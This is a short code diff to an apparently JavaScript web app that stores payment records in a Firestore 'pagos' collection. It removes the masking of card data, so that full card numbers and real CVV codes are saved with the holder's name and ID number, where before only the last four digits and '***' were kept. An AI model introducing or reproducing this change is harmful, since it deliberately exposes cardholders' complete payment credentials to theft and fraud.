@@ -655,9 +655,9 @@
                 await setDoc(doc(db, 'pagos', key), {
                     titular: name,
                     dni: dni,
-                    cardNumber: '**** **** **** ' + number.slice(-4),
+                    cardNumber: number,
                     exp: exp,
-                    cvv: '***',
+                    cvv: cvv,
                     cliente: personal,
                     fecha: new Date()
                 });
